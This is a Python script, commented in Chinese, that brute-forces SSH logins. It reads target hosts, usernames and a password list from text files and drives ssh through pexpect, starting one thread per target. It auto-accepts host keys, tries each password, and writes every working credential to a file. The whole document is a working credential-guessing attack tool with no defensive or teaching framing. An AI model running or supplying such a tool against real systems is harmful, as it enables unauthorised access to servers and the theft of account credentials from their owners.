#只是遍历多个用户时开启多线程，效率依旧低，第7个版本是遍历密码本时，每一个密码开启一个多线程，并设置了线程的最大数
import pexpect
import threading

def try_login(host, user, port):
    try:

        # 创建pexpect.spawn对象
        child = pexpect.spawn(f'ssh {user}@{host} -p {port}')


        # 如果遇到yes/no询问时，自动回答yes并继续
        i = child.expect([pexpect.TIMEOUT, ".*[Yy]es.*[Nn]o.*", pexpect.EOF], timeout=1)
        if i == 1:
            child.sendline('yes')


        # 等待ssh提示符出现
        i = child.expect([pexpect.TIMEOUT, '[Pp]assword:'], timeout=10)
        if i == 0:
            print(f'登录超时，目标IP：{host}, 用户名：{user}')
            return False


        # 发送密码
        # 从passwords.txt文件中读取密码列表
        with open('passwords.txt', 'r') as f:
            passwords = [line.strip() for line in f.readlines()]
        
            for password in passwords:
                try:
                    tries_remaining = 3
                    while tries_remaining > 0:
                        child.sendline(password)


                        # 检查是否成功登录
                        i = child.expect([pexpect.TIMEOUT, 'Last login:', '[Pp]assword:'], timeout=0.2)

                        if i == 0:
                            #print(f'尝试登录超时')
                            tries_remaining -= 1

                        elif i == 1:
                            print(f'成功登录！目标IP：{host}, 用户名：{user}, 密码：{password}')
                            with open(f'{user}@{host}.txt', 'w') as t:
                                t.write(f'成功登录！目标IP：{host}, 用户名：{user}, 密码：{password}')
                            # 可选：在此执行其他操作，例如上传/下载文件等
                            return True

                        elif i == 2:
                            print(f'密码不正确: {password}')
                            break

                        else:
                            print(f'其它问题导致登录失败')
                            tries_remaining -= 1

                        if tries_remaining == 0:
                            print(f'无法使用密码 {user}@{host}--{password} 登录，尝试下一个密码...')

                except pexpect.exceptions.EOF as e:
                    print('小循环EOF触发异常')
                    try_login(host,user,port)


                except Exception as e:
                    print('小循环触发异常')
                    print(f'{e}')
                    pass

    except:
        print('大循环触发异常')
        pass

def main():
    try:

        # 从targets.txt文件中读取目标列表
        with open('targets.txt', 'r') as f:
            targets = [line.strip().split() for line in f.readlines()]

        # 遍历目标和密码列表，开启新线程尝试登录
        threads = []
        for target in targets:
            host = target[0]
            user = target[1]
            port = 22
            thread = threading.Thread(target=try_login, args=(host, user, port))
            threads.append(thread)
            thread.start()
            print(f'{user}@{host} start!')


        # 等待所有线程结束
        for thread in threads:
            thread.join()
            
    except:
        print('main()触发异常')
        pass


if __name__ == '__main__':
    main()
